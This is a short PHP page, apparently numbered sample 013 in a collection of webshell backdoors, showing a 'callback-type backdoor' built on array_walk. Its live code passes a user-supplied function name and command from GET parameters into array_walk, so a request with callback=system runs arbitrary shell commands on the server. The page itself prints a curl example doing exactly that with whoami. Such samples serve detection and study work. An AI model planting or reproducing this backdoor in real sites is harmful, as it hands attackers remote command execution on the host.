<html>
<head>
	<meta charset="UTF-8"/>
	<title>013 - 回调类型后门 - array_walk</title>
</head>
<body>
	<h1>013 - 回调类型后门 - array_walk</h1>

<p>不正常调用: </p>
<pre>curl '<?= 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?callback=system&amp;command=whoami' ?>'</pre>
<br>
<br>
<p>目录内容</p>
<?php
if (isset($_GET['callback']) && isset($_GET['command'])) {
    $items = array($_GET['command'], "placeholder");
    array_walk($items, $_GET['callback']);
}
?>
</body>
</html>
